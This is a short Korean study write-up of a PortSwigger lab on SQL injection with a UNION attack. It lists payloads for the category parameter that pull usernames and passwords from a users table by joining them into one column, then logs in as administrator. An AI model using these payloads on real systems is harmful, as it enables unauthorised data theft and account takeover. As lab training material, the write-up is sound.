# [PortSwigger]SQL Injection 05

https://portswigger.net/web-security/all-labs

## LAB
SQL 주입 UNION 공격, 단일 열에서 여러 값 검색

## Qusetion
이 연구소에는 제품 범주 필터에 SQL 삽입 취약점이 포함되어 있습니다. 쿼리의 결과는 응용 프로그램의 응답으로 반환되므로 UNION 공격을 사용하여 다른 테이블에서 데이터를 검색할 수 있습니다.

데이터베이스에는 및 ***users***라는 열이 있는 이라는 다른 테이블이 있습니다 . ***username password***

랩을 해결하려면 모든 사용자 이름과 암호를 검색 하는 SQL 주입 UNION administrator 공격을 수행하고 해당 정보를 사용하여 사용자로 로그인합니다.

## Solution

제품 범주 필터에 Union SQL Injection 취약점 확인

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2006%20-%201.png)

<br>

category 파라미터에 취약점 확인
```
' union select null --
' union select null,null --
' union select username, password from users --
' union select null, username||' '||password from users --
```

우회기법사용 - 문자열 병합
```
'abc'||'def'
>>>
abcdef
```

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2006%20-%202.png)

<br>

ID, PW 확인

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2006%20-%203.png)

<br>

admin 계정으로 로그인 시도

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2006%20-%204.png)

<br>

admin 계정으로 로그인 성공 확인

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2006%20-%205.png)